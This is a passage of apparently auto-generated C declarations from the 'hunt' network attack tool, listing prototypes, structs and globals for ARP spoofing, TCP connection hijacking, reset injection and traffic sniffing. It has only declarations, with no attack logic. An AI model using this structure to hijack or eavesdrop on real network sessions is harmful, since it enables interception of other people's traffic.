extern signed int tcsetattr(signed int, signed int, struct termios *);
// time
// file /usr/include/time.h line 192
extern signed long int time(signed long int *);
// timejob_thread
// file timer.c line 107
static void * timejob_thread(void *arg);
// timer_done
// file hunt.h line 648
void timer_done(void);
// timer_init
// file hunt.h line 647
void timer_init(void);
// tj_func
// file main.c line 454
signed int tj_func(void *arg, signed int sec);
// tty_atexit
// file hunt.h line 586
void tty_atexit(void);
// tty_cbreak
// file tty.c line 19
signed int tty_cbreak(signed int fd, signed int wait_for_chars, signed int timer_dsec);
// tty_raw
// file hunt.h line 584
signed int tty_raw(signed int fd, signed int wait_for_chars, signed int timer_dsec);
// tty_reset
// file hunt.h line 585
signed int tty_reset(signed int fd);
// tty_tput_reset
// file hunt.h line 587
void tty_tput_reset(void);
// uci_generate_key
// file hunt.h line 307
static inline unsigned int uci_generate_key(struct user_conn_info *uci);
// uci_generate_key_link1
// file hunt.h line 307
static inline unsigned int uci_generate_key_link1(struct user_conn_info *uci_link1);
// unregister_timejob
// file hunt.h line 646
void unregister_timejob(struct timejob *tj);
// update_a_items
// file c/array.c line 14
static inline void update_a_items(struct array *a, signed int nr, void *m);
// update_thr
// file resolv.c line 127
static void * update_thr(void *arg);
// usage
// file main.c line 413
static void usage(char *argv0);
// user_arp_hijack
// file hunt.h line 503
signed int user_arp_hijack(struct user_conn_info *uci, char *src_fake_mac, char *dst_fake_mac, signed int input_mode);
// user_arp_hijack_done
// file hunt.h line 505
void user_arp_hijack_done(char *src_fake_mac, char *dst_fake_mac);
// user_arpspoof_test
// file hunt.h line 529
signed int user_arpspoof_test(struct arp_spoof_info *asi);
// user_hijack_sync
// file hunt.h line 512
signed int user_hijack_sync(struct user_conn_info *uci);
// user_rst
// file hunt.h line 474
void user_rst(struct user_conn_info *uci, signed int count, signed int mode);
// user_run_arpspoof_until_successed
// file hunt.h line 532
signed int user_run_arpspoof_until_successed(struct arp_spoof_info *asi);
// user_stormack_hijack
// file hunt.h line 490
signed int user_stormack_hijack(struct user_conn_info *uci, char *cmdbuf);
// verbose_setup
// file options.c line 194
static void verbose_setup(void);
// waitpid
// file /usr/include/x86_64-linux-gnu/sys/wait.h line 125
extern signed int waitpid(signed int, signed int *, signed int);
// watch_tty
// file arphijack.c line 52
static void * watch_tty(struct watch_tty_data *wtd);
// write
// file /usr/include/unistd.h line 366
extern signed long int write(signed int, const void *, unsigned long int);
// writen
// file util.c line 374
signed int writen(signed int fd, char *ptr, signed int nbytes);

struct anonymous_25
{
  // _call_addr
  void *_call_addr;
  // _syscall
  signed int _syscall;
  // _arch
  unsigned int _arch;
};

struct anonymous_23
{
  // si_addr
  void *si_addr;
  // si_addr_lsb
  signed short int si_addr_lsb;
};

struct anonymous_29
{
  // __fds_bits
  signed long int __fds_bits[16l];
};

struct anonymous_3
{
  // __val
  unsigned long int __val[16l];
};

struct anonymous_5
{
  // __lock
  signed int __lock;
  // __futex
  unsigned int __futex;
  // __total_seq
  unsigned long long int __total_seq;
  // __wakeup_seq
  unsigned long long int __wakeup_seq;
  // __woken_seq
  unsigned long long int __woken_seq;
  // __mutex
  void *__mutex;
  // __nwaiters
  unsigned int __nwaiters;
  // __broadcast_seq
  unsigned int __broadcast_seq;
};

struct anonymous_19
{
  // si_pid
  signed int si_pid;
  // si_uid
  unsigned int si_uid;
};

struct anonymous_22
{
  // si_pid
  signed int si_pid;
  // si_uid
  unsigned int si_uid;
  // si_status
  signed int si_status;
  // si_utime
  signed long int si_utime;
  // si_stime
  signed long int si_stime;
};

union sigval
{
  // sival_int
  signed int sival_int;
  // sival_ptr
  void *sival_ptr;
};

struct anonymous_21
{
  // si_pid
  signed int si_pid;
  // si_uid
  unsigned int si_uid;
  // si_sigval
  union sigval si_sigval;
};

struct anonymous_20
{
  // si_tid
  signed int si_tid;
  // si_overrun
  signed int si_overrun;
  // si_sigval
  union sigval si_sigval;
};

struct anonymous_24
{
  // si_band
  signed long int si_band;
  // si_fd
  signed int si_fd;
};

union anonymous_26
{
  // _pad
  signed int _pad[28l];
  // _kill
  struct anonymous_19 _kill;
  // _timer
  struct anonymous_20 _timer;
  // _rt
  struct anonymous_21 _rt;
  // _sigchld
  struct anonymous_22 _sigchld;
  // _sigfault
  struct anonymous_23 _sigfault;
  // _sigpoll
  struct anonymous_24 _sigpoll;
  // _sigsys
  struct anonymous_25 _sigsys;
};

struct anonymous_27
{
  // si_signo
  signed int si_signo;
  // si_errno
  signed int si_errno;
  // si_code
  signed int si_code;
  // _sifields
  union anonymous_26 _sifields;
};

struct anonymous_12
{
  // __glibc_reserved
  unsigned short int __glibc_reserved;
  // mtu
  unsigned short int mtu;
};

struct anonymous
{
  // id
  unsigned short int id;
  // seq
  unsigned short int seq;
};

struct anonymous_11
{
  // id
  unsigned short int id;
  // sequence
  unsigned short int sequence;
};

struct anonymous_15
{
  // source
  unsigned short int source;
  // dest
  unsigned short int dest;
  // len
  unsigned short int len;
  // check
  unsigned short int check;
};

struct anonymous_8
{
  // source
  unsigned short int source;
  // dest
  unsigned short int dest;
  // seq
  unsigned int seq;
  // ack_seq
  unsigned int ack_seq;
  // res1
  unsigned short int res1 : 4;
  // doff
  unsigned short int doff : 4;
  // fin
  unsigned short int fin : 1;
  // syn
  unsigned short int syn : 1;
  // rst
  unsigned short int rst : 1;
  // psh
  unsigned short int psh : 1;
  // ack
  unsigned short int ack : 1;
  // urg
  unsigned short int urg : 1;
  // res2
  unsigned short int res2 : 2;
  // window
  unsigned short int window;
  // check
  unsigned short int check;
  // urg_ptr
  unsigned short int urg_ptr;
};

struct anonymous_7
{
  // th_sport
  unsigned short int th_sport;
  // th_dport
  unsigned short int th_dport;
  // th_seq
  unsigned int th_seq;
  // th_ack
  unsigned int th_ack;
  // th_x2
  unsigned char th_x2 : 4;
  // th_off
  unsigned char th_off : 4;
  // th_flags
  unsigned char th_flags;
  // th_win
  unsigned short int th_win;
  // th_sum
  unsigned short int th_sum;
  // th_urp
  unsigned short int th_urp;
};

struct anonymous_14
{
  // uh_sport
  unsigned short int uh_sport;
  // uh_dport
  unsigned short int uh_dport;
  // uh_ulen
  unsigned short int uh_ulen;
  // uh_sum
  unsigned short int uh_sum;
};

union anonymous_1
{
  // p_tcph
  struct tcphdr *p_tcph;
  // p_udph
  struct udphdr *p_udph;
  // p_icmph
  struct icmphdr *p_icmph;
};

union anonymous_28
{
  // sa_handler
  void (*sa_handler)(signed int);
  // sa_sigaction
  void (*sa_sigaction)(signed int, struct anonymous_27 *, void *);
};

union anonymous_17
{
  // ifrn_name
  char ifrn_name[16l];
};

union anonymous_9
{
  // __size
  char __size[4l];
  // __align
  signed int __align;
};

union anonymous_4
{
  // __data
  struct anonymous_5 __data;
  // __size
  char __size[48l];
  // __align
  signed long long int __align;
};

union anonymous_0
{
  // idseq
  struct anonymous idseq;
  // res
  unsigned int res;
};

union anonymous_13
{
  // echo
  struct anonymous_11 echo;
  // gateway
  unsigned int gateway;
  // frag
  struct anonymous_12 frag;
};

union anonymous_6
{
  // _anon0
  struct anonymous_7 _anon0;
  // _anon1
  struct anonymous_8 _anon1;
};

union anonymous_16
{
  // _anon0
  struct anonymous_14 _anon0;
  // _anon1
  struct anonymous_15 _anon1;
};

struct __pthread_internal_list
{
  // __prev
  struct __pthread_internal_list *__prev;
  // __next
  struct __pthread_internal_list *__next;
};

struct __pthread_mutex_s
{
  // __lock
  signed int __lock;
  // __count
  unsigned int __count;
  // __owner
  signed int __owner;
  // __nusers
  unsigned int __nusers;
  // __kind
  signed int __kind;
  // __spins
  signed short int __spins;
  // __elision
  signed short int __elision;
  // __list
  struct __pthread_internal_list __list;
};

union anonymous_2
{
  // __data
  struct __pthread_mutex_s __data;
  // __size
  char __size[40l];
  // __align
  signed long int __align;
};

struct sockaddr
{
  // sa_family
  unsigned short int sa_family;
  // sa_data
  char sa_data[14l];
};

struct ifmap
{
  // mem_start
  unsigned long int mem_start;
  // mem_end
  unsigned long int mem_end;
  // base_addr
  unsigned short int base_addr;
  // irq
  unsigned char irq;
  // dma
  unsigned char dma;
  // port
  unsigned char port;
};

union anonymous_18
{
  // ifru_addr
  struct sockaddr ifru_addr;
  // ifru_dstaddr
  struct sockaddr ifru_dstaddr;
  // ifru_broadaddr
  struct sockaddr ifru_broadaddr;
  // ifru_netmask
  struct sockaddr ifru_netmask;
  // ifru_hwaddr
  struct sockaddr ifru_hwaddr;
  // ifru_flags
  signed short int ifru_flags;
  // ifru_ivalue
  signed int ifru_ivalue;
  // ifru_mtu
  signed int ifru_mtu;
  // ifru_map
  struct ifmap ifru_map;
  // ifru_slave
  char ifru_slave[16l];
  // ifru_newname
  char ifru_newname[16l];
  // ifru_data
  char *ifru_data;
};

struct _IO_FILE
{
  // _flags
  signed int _flags;
  // _IO_read_ptr
  char *_IO_read_ptr;
  // _IO_read_end
  char *_IO_read_end;
  // _IO_read_base
  char *_IO_read_base;
  // _IO_write_base
  char *_IO_write_base;
  // _IO_write_ptr
  char *_IO_write_ptr;
  // _IO_write_end
  char *_IO_write_end;
  // _IO_buf_base
  char *_IO_buf_base;
  // _IO_buf_end
  char *_IO_buf_end;
  // _IO_save_base
  char *_IO_save_base;
  // _IO_backup_base
  char *_IO_backup_base;
  // _IO_save_end
  char *_IO_save_end;
  // _markers
  struct _IO_marker *_markers;
  // _chain
  struct _IO_FILE *_chain;
  // _fileno
  signed int _fileno;
  // _flags2
  signed int _flags2;
  // _old_offset
  signed long int _old_offset;
  // _cur_column
  unsigned short int _cur_column;
  // _vtable_offset
  signed char _vtable_offset;
  // _shortbuf
  char _shortbuf[1l];
  // _lock
  void *_lock;
  // _offset
  signed long int _offset;
  // __pad1
  void *__pad1;
  // __pad2
  void *__pad2;
  // __pad3
  void *__pad3;
  // __pad4
  void *__pad4;
  // __pad5
  unsigned long int __pad5;
  // _mode
  signed int _mode;
  // _unused2
  char _unused2[(signed long int)(sizeof(signed int) * 5) /*20l*/ ];
};

struct _IO_marker
{
  // _next
  struct _IO_marker *_next;
  // _sbuf
  struct _IO_FILE *_sbuf;
  // _pos
  signed int _pos;
};

struct __jmp_buf_tag
{
  // __jmpbuf
  signed long int __jmpbuf[8l];
  // __mask_was_saved
  signed int __mask_was_saved;
  // __saved_mask
  struct anonymous_3 __saved_mask;
};

struct add_policy_info
{
  // src_addr
  unsigned int src_addr;
  // src_mask
  unsigned int src_mask;
  // dst_addr
  unsigned int dst_addr;
  // dst_mask
  unsigned int dst_mask;
  // src_ports
  unsigned int src_ports[17l];
  // dst_ports
  unsigned int dst_ports[17l];
  // next
  struct add_policy_info *next;
};

struct arp_dont_relay
{
  // src_addr
  unsigned int src_addr;
  // dst_addr
  unsigned int dst_addr;
  // src_port
  unsigned short int src_port;
  // dst_port
  unsigned short int dst_port;
  // next
  struct arp_dont_relay *next;
};

struct arp_spec
{
  // src_mac
  char *src_mac;
  // dst_mac
  char *dst_mac;
  // oper
  signed int oper;
  // sender_mac
  char *sender_mac;
  // sender_addr
  unsigned long int sender_addr;
  // target_mac
  char *target_mac;
  // target_addr
  unsigned long int target_addr;
};

struct arp_spoof_info
{
  // src_fake_mac
  unsigned char src_fake_mac[6l];
  // src_mac
  unsigned char src_mac[6l];
  // dst_mac
  unsigned char dst_mac[6l];
  // src_mac_valid
  signed int src_mac_valid;
  // dst_mac_valid
  signed int dst_mac_valid;
  // src_addr
  unsigned int src_addr;
  // dst_addr
  unsigned int dst_addr;
  // can_forward
  signed int can_forward;
  // in_range
  signed int in_range;
  // use_count
  signed int use_count;
  // lock_count
  signed int lock_count;
  // refresh
  signed int refresh;
  // tj_refresh
  struct timejob *tj_refresh;
  // tj_reply
  struct timejob *tj_reply;
  // next
  struct arp_spoof_info *next;
  // lock_cond
  union anonymous_4 lock_cond;
  // mutex
  union anonymous_2 mutex;
};

struct arp_spoof_range
{
  // asi
  struct arp_spoof_info **asi;
  // asi_count
  signed int asi_count;
  // dst_start_addr
  unsigned int dst_start_addr;
  // dst_end_addr
  unsigned int dst_end_addr;
  // src_addr
  unsigned int src_addr;
  // src_fake_mac
  char src_fake_mac[6l];
  // refresh
  signed int refresh;
  // can_forward
  signed int can_forward;
  // next
  struct arp_spoof_range *next;
};

struct arpeth_hdr
{
  // ar_sha
  unsigned char ar_sha[6l];
  // ar_sip
  unsigned char ar_sip[4l];
  // ar_tha
  unsigned char ar_tha[6l];
  // ar_tip
  unsigned char ar_tip[4l];
};

struct arphdr
{
  // ar_hrd
  unsigned short int ar_hrd;
  // ar_pro
  unsigned short int ar_pro;
  // ar_hln
  unsigned char ar_hln;
  // ar_pln
  unsigned char ar_pln;
  // ar_op
  unsigned short int ar_op;
};

struct array
{
  // a_arr
  struct array_item *a_arr;
  // a_size
  signed int a_size;
  // a_items
  signed int a_items;
  // a_locked
  signed int a_locked;
  // a_locked_thr
  unsigned long int a_locked_thr;
  // a_mutex
  union anonymous_2 a_mutex;
};

struct array_item
{
  // ai_data
  void *ai_data;
};

struct array_iterator
{
  // i_array
  struct array *i_array;
  // i_pos
  signed int i_pos;
};

struct host_info
{
  // next_seq
  unsigned long int next_seq;
  // next_d_seq
  unsigned long int next_d_seq;
  // src_mac
  unsigned char src_mac[6l];
  // dst_mac
  unsigned char dst_mac[6l];
  // window
  unsigned short int window;
  // id
  unsigned short int id;
  // delta_d_seq
  unsigned int delta_d_seq;
};

struct conn_info
{
  // src_addr
  unsigned long int src_addr;
  // dst_addr
  unsigned long int dst_addr;
  // src_port
  unsigned short int src_port;
  // dst_port
  unsigned short int dst_port;
  // src
  struct host_info src;
  // dst
  struct host_info dst;
  // use_count
  signed int use_count;
  // update_count
  unsigned int update_count;
  // ack_storm_notify_sec
  unsigned int ack_storm_notify_sec;
  // mutex
  union anonymous_2 mutex;
};

struct ethhdr
{
  // h_dest
  unsigned char h_dest[6l];
  // h_source
  unsigned char h_source[6l];
  // h_proto
  unsigned short int h_proto;
} __attribute__ ((__packed__));

struct hash
{
  // h_items
  signed int h_items;
  // h_max_items
  signed int h_max_items;
  // h_space_after
  signed int h_space_after;
  // h_table
  struct hash_table_item *h_table;
  // h_eqfunc
  signed int (*h_eqfunc)(unsigned int, void *, void *);
  // h_locked
  signed int h_locked;
  // h_locked_thr
  unsigned long int h_locked_thr;
  // h_mutex
  union anonymous_2 h_mutex;
};

struct hash_iterator
{
  // i_hash
  struct hash *i_hash;
  // i_pos
  signed int i_pos;
};

struct hash_table_item
{
  // ht_key
  unsigned int ht_key;
  // ht_data
  void *ht_data;
};

struct host_up_info
{
  // start_addr
  unsigned int start_addr;
  // end_addr
  unsigned int end_addr;
  // up_ping
  signed int *up_ping;
  // promisc_ping
  signed int *promisc_ping;
  // up_arp
  signed int *up_arp;
  // promisc_arp
  signed int *promisc_arp;
  // up_len
  unsigned int up_len;
};

struct hostent
{
  // h_name
  char *h_name;
  // h_aliases
  char **h_aliases;
  // h_addrtype
  signed int h_addrtype;
  // h_length
  signed int h_length;
  // h_addr_list
  char **h_addr_list;
};

struct icmp_spec
{
  // src_addr
  unsigned int src_addr;
  // dst_addr
  unsigned int dst_addr;
  // src_mac
  char *src_mac;
  // dst_mac
  char *dst_mac;
  // type
  signed short int type;
  // code
  signed short int code;
  // un
  union anonymous_0 un;
  // data
  void *data;
  // data_len
  signed int data_len;
};

struct icmphdr
{
  // type
  unsigned char type;
  // code
  unsigned char code;
  // checksum
  unsigned short int checksum;
  // un
  union anonymous_13 un;
};

struct ifreq
{
  // ifr_ifrn
  union anonymous_17 ifr_ifrn;
  // ifr_ifru
  union anonymous_18 ifr_ifru;
};

struct ifunc_item
{
  // func
  void (*func)(struct packet *, void *);
  // arg
  void *arg;
  // next_tcp
  struct ifunc_list *next_tcp;
  // next_udp
  struct ifunc_list *next_udp;
  // next_icmp
  struct ifunc_list *next_icmp;
  // next_arp
  struct ifunc_list *next_arp;
  // next_ip
  struct ifunc_list *next_ip;
};

struct in_addr
{
  // s_addr
  unsigned int s_addr;
};

struct iovec
{
  // iov_base
  void *iov_base;
  // iov_len
  unsigned long int iov_len;
};

struct iphdr
{
  // ihl
  unsigned int ihl : 4;
  // version
  unsigned int version : 4;
  // tos
  unsigned char tos;
  // tot_len
  unsigned short int tot_len;
  // id
  unsigned short int id;
  // frag_off
  unsigned short int frag_off;
  // ttl
  unsigned char ttl;
  // protocol
  unsigned char protocol;
  // check
  unsigned short int check;
  // saddr
  unsigned int saddr;
  // daddr
  unsigned int daddr;
};

struct list
{
  // l_first
  void *l_first;
  // l_last
  void *l_last;
  // l_off
  signed int l_off;
  // l_produce_done
  signed int l_produce_done;
  // l_iter
  struct list_iterator *l_iter;
  // l_locked
  signed int l_locked;
  // l_mutex
  union anonymous_2 l_mutex;
  // l_notempty
  union anonymous_4 l_notempty;
  // l_locked_thr
  unsigned long int l_locked_thr;
};

struct list_iterator
{
  // i_list
  struct list *i_list;
  // i_cur
  void *i_cur;
  // i_next
  struct list_iterator *i_next;
};

struct mac_disc_info
{
  // start_addr
  unsigned int start_addr;
  // end_addr
  unsigned int end_addr;
  // next
  struct mac_disc_info *next;
};

struct mac_info
{
  // mac
  char mac[6l];
  // mutex
  union anonymous_2 mutex;
};

struct msghdr
{
  // msg_name
  void *msg_name;
  // msg_namelen
  unsigned int msg_namelen;
  // msg_iov
  struct iovec *msg_iov;
  // msg_iovlen
  unsigned long int msg_iovlen;
  // msg_control
  void *msg_control;
  // msg_controllen
  unsigned long int msg_controllen;
  // msg_flags
  signed int msg_flags;
};

struct packet
{
  // p_raw
  char p_raw[1514l];
  // p_raw_len
  signed int p_raw_len;
  // p_use_count
  signed int p_use_count;
  // p_type
  enum PACKET_TYPE p_type;
  // p_mutex
  union anonymous_2 p_mutex;
  // p_ethh
  struct ethhdr *p_ethh;
  // p_iph
  struct iphdr *p_iph;
  // p_arph
  struct arphdr *p_arph;
  // p_hdr
  union anonymous_1 p_hdr;
  // p_data_len
  signed int p_data_len;
  // p_data
  char *p_data;
  // p_timestamp
  signed long int p_timestamp;
  // p_next_free
  struct packet *p_next_free;
  // p_next
  struct packet *p_next[8l];
  // p_arg
  void *p_arg[8l];
  // p_ipc
  signed int p_ipc;
  // p_ipc_arg
  void *p_ipc_arg;
};

struct packet_info
{
  // src_addr
  unsigned long int src_addr;
  // dst_addr
  unsigned long int dst_addr;
  // src_port
  unsigned short int src_port;
  // dst_port
  unsigned short int dst_port;
  // src
  struct host_info src;
  // next
  struct packet_info *next;
};

union pthread_attr_t
{
  // __size
  char __size[56l];
  // __align
  signed long int __align;
};

struct relay_item
{
  // mutex
  union anonymous_2 mutex;
  // lock_cond
  union anonymous_4 lock_cond;
  // lock_count
  signed int lock_count;
  // src_addr
  unsigned int src_addr;
  // src_mask
  unsigned int src_mask;
  // dst_addr
  unsigned int dst_addr;
  // dst_mask
  unsigned int dst_mask;
  // src_ports
  unsigned int src_ports[17l];
  // dst_ports
  unsigned int dst_ports[17l];
  // flags
  unsigned int flags;
  // ethtap_fd
  signed int ethtap_fd;
  // ethtap_name
  char *ethtap_name;
  // ethtap_mac
  char ethtap_mac[6l];
  // next
  struct relay_item *next;
};

struct req
{
  // ip
  unsigned int ip;
  // next
  struct req *next;
};

struct res
{
  // err
  signed int err;
  // ip
  unsigned int ip;
  // name_len
  signed int name_len;
  // name
  char name[0l];
};

struct resolv_item
{
  // name
  char *name;
  // put_timestamp
  signed long int put_timestamp;
  // get_timestamp
  signed long int get_timestamp;
  // mutex
  union anonymous_2 mutex;
};

struct rst_db_item
{
  // src_addr
  unsigned int src_addr;
  // src_mask
  unsigned int src_mask;
  // dst_addr
  unsigned int dst_addr;
  // dst_mask
  unsigned int dst_mask;
  // src_ports
  unsigned int src_ports[17l];
  // dst_ports
  unsigned int dst_ports[17l];
  // rst_mode
  signed int rst_mode;
  // rst_only_syn
  signed int rst_only_syn;
  // next
  struct rst_db_item *next;
};

struct servent
{
  // s_name
  char *s_name;
  // s_aliases
  char **s_aliases;
  // s_port
  signed int s_port;
  // s_proto
  char *s_proto;
};

struct sigaction
{
  // __sigaction_handler
  union anonymous_28 __sigaction_handler;
  // sa_mask
  struct anonymous_3 sa_mask;
  // sa_flags
  signed int sa_flags;
  // sa_restorer
  void (*sa_restorer)(void);
};

struct slave
{
  // s_req
  struct req s_req;
  // s_timestamp
  signed long int s_timestamp;
  // s_pid
  signed int s_pid;
  // s_fd
  signed int s_fd;
  // s_next
  struct slave *s_next;
};

struct sniff_info
{
  // src_addr
  unsigned int src_addr;
  // dst_addr
  unsigned int dst_addr;
  // src_mask
  signed int src_mask;
  // dst_mask
  signed int dst_mask;
  // src_ports
  signed int src_ports[17l];
  // dst_ports
  signed int dst_ports[17l];
  // srch_mode
  signed int srch_mode;
  // search
  char *search;
  // log_mode
  signed int log_mode;
  // log_bytes
  signed int log_bytes;
  // file_close
  signed int file_close;
  // file
  struct _IO_FILE *file;
  // log
  struct list log;
  // lock_count
  signed int lock_count;
  // lock_cond
  union anonymous_4 lock_cond;
  // mutex
  union anonymous_2 mutex;
};

struct sniff_log
{
  // src_addr
  unsigned int src_addr;
  // dst_addr
  unsigned int dst_addr;
  // src_port
  unsigned short int src_port;
  // dst_port
  unsigned short int dst_port;
  // src_to_dst
  signed int src_to_dst;
  // loged_bytes
  signed int loged_bytes;
  // buf
  char *buf;
  // state
  signed int state;
  // file_close
  signed int file_close;
  // file
  struct _IO_FILE *file;
  // next
  struct sniff_log *next;
};

struct timespec
{
  // tv_sec
  signed long int tv_sec;
  // tv_nsec
  signed long int tv_nsec;
};

struct stat
{
  // st_dev
  unsigned long int st_dev;
  // st_ino
  unsigned long int st_ino;
  // st_nlink
  unsigned long int st_nlink;
  // st_mode
  unsigned int st_mode;
  // st_uid
  unsigned int st_uid;
  // st_gid
  unsigned int st_gid;
  // __pad0
  signed int __pad0;
  // st_rdev
  unsigned long int st_rdev;
  // st_size
  signed long int st_size;
  // st_blksize
  signed long int st_blksize;
  // st_blocks
  signed long int st_blocks;
  // st_atim
  struct timespec st_atim;
  // st_mtim
  struct timespec st_mtim;
  // st_ctim
  struct timespec st_ctim;
  // __glibc_reserved
  signed long int __glibc_reserved[3l];
};

struct tcp_spec
{
  // saddr
  unsigned long int saddr;
  // daddr
  unsigned long int daddr;
  // sport
  unsigned short int sport;
  // dport
  unsigned short int dport;
  // src_mac
  char *src_mac;
  // dst_mac
  char *dst_mac;
  // seq
  unsigned long int seq;
  // ack_seq
  unsigned long int ack_seq;
  // window
  unsigned short int window;
  // id
  unsigned short int id;
  // ack
  signed int ack;
  // rst
  signed int rst;
  // psh
  signed int psh;
  // data
  char *data;
  // data_len
  signed int data_len;
};

struct tcphdr
{
  // _anon0
  union anonymous_6 _anon0;
};

struct termios
{
  // c_iflag
  unsigned int c_iflag;
  // c_oflag
  unsigned int c_oflag;
  // c_cflag
  unsigned int c_cflag;
  // c_lflag
  unsigned int c_lflag;
  // c_line
  unsigned char c_line;
  // c_cc
  unsigned char c_cc[32l];
  // c_ispeed
  unsigned int c_ispeed;
  // c_ospeed
  unsigned int c_ospeed;
};

struct timejob
{
  // j_func
  signed int (*j_func)(void *, signed int);
  // j_arg
  void *j_arg;
  // j_arg_sec
  signed int j_arg_sec;
  // j_ts
  struct timespec j_ts;
  // j_next
  struct time_job *j_next;
};

struct timeval
{
  // tv_sec
  signed long int tv_sec;
  // tv_usec
  signed long int tv_usec;
};

struct timezone
{
  // tz_minuteswest
  signed int tz_minuteswest;
  // tz_dsttime
  signed int tz_dsttime;
};

union u_longchar
{
  // buff
  char buff[4l];
  // val
  unsigned long int val;
};

struct udphdr
{
  // _anon0
  union anonymous_16 _anon0;
};

struct user_conn_info
{
  // src_addr
  unsigned long int src_addr;
  // dst_addr
  unsigned long int dst_addr;
  // src_port
  unsigned short int src_port;
  // dst_port
  unsigned short int dst_port;
};

struct watch_tty_data
{
  // src_fake_mac
  char *src_fake_mac;
  // ci
  struct conn_info *ci;
  // input_mode
  signed int input_mode;
};


// __hv_hash
// file c/hash.c line 72
static unsigned int __hv_hash;
// __hv_hash_save
// file c/hash.c line 73
static unsigned int __hv_hash_save;
// __hv_max_items
// file c/hash.c line 74
static unsigned int __hv_max_items;
// __suggest_mac
// file util.c line 345
unsigned char __suggest_mac[6l] = { (unsigned char)0xEA, (unsigned char)0x1A, (unsigned char)0xDE, (unsigned char)0xAD, (unsigned char)0xBE, (unsigned char)0x00 };
// arp_request_spoof_through_request
// file arpspoof.c line 41
signed int arp_request_spoof_through_request = 1;
// arp_rr_count
// file arpspoof.c line 42
signed int arp_rr_count = 2;
// arp_spoof_switch
// file arpspoof.c line 43
signed int arp_spoof_switch = 1;
// arp_spoof_with_my_mac
// file arpspoof.c line 44
signed int arp_spoof_with_my_mac = 0;
// asi_dst
// file arphijack.c line 100
static struct arp_spoof_info *asi_dst;
// asi_src
// file arphijack.c line 99
static struct arp_spoof_info *asi_src;
// bytes_received
// file hunt.c line 726
unsigned int bytes_received = (unsigned int)0;
// can_forward_question
// file arpspoof.c line 45
signed int can_forward_question = 0;
// cond_hunt_ready
// file hunt.c line 39
union anonymous_4 cond_hunt_ready = { .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } };
// cond_stop
// file macdisc.c line 79
static union anonymous_4 cond_stop = { .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } };
// conn_list_mac
// file hunt.c line 31
signed int conn_list_mac = 0;
// conn_list_seq
// file hunt.c line 32
signed int conn_list_seq = 0;
// conn_table
// file hunt.c line 34
struct hash conn_table;
// ctrl_c_signaled
// file menu.c line 109
static signed int ctrl_c_signaled;
// dont_relay
// file arphijack.c line 101
static struct arp_dont_relay *dont_relay;
// eth_device
// file main.c line 433
char *eth_device = "eth0";
// f_sync_done
// file synchijack.c line 120
volatile signed int f_sync_done;
// fd_req
// file resolv.c line 46
static signed int fd_req = -1;
// hl_mode
// file resolv.c line 20
signed int hl_mode = 0;
// hunt_ready
// file hunt.c line 37
signed int hunt_ready = 0;
// ifunc_arp
// file arpspoof.c line 34
static struct ifunc_item ifunc_arp;
// ifunc_relay
// file arpspoof.c line 37
static struct ifunc_item ifunc_relay;
// ifunc_sniff
// file sniff.c line 62
static struct ifunc_item ifunc_sniff;
// ifunc_tcp
// file rstd.c line 33
static struct ifunc_item ifunc_tcp;
// intr_mask
// file main.c line 452
struct anonymous_3 intr_mask;
// ip_to_name_table
// file resolv.c line 19
struct hash ip_to_name_table;
// jmp_hostbyname
// file menu.c line 108
static struct __jmp_buf_tag jmp_hostbyname[1l];
// l_add_policy
// file addpolicy.c line 16
struct list l_add_policy = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct add_policy_info *)0)->next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_arp_dont_relay
// file arpspoof.c line 32
static struct list l_arp_dont_relay = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct arp_dont_relay *)0)->next - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_arp_packet
// file hostup.c line 22
static struct list l_arp_packet = { .l_first=(void *)0, .l_last=(void *)0, .l_off=(signed int)((char *)&((struct packet *)0)->p_next[(signed long int)5] - (char *)0),
    .l_produce_done=0,
    .l_iter=(struct list_iterator *)(void *)0, .l_locked=0,
    .l_mutex={ .__data={ .__lock=0, .__count=(unsigned int)0, .__owner=0, .__nusers=(unsigned int)0,
    .__kind=0, .__spins=(signed short int)0,
    .__elision=(signed short int)0, .__list={ .__prev=((struct __pthread_internal_list *)NULL), .__next=((struct __pthread_internal_list *)NULL) } } }, .l_notempty={ .__data={ .__lock=0, .__futex=(unsigned int)0, .__total_seq=(unsigned long long int)0, .__wakeup_seq=(unsigned long long int)0,
    .__woken_seq=(unsigned long long int)0,
    .__mutex=(void *)0,
    .__nwaiters=(unsigned int)0, .__broadcast_seq=(unsigned int)0 } },
    .l_locked_thr=(unsigned long int)0 };
// l_arp_spoof
// file arpspoof.c line 31
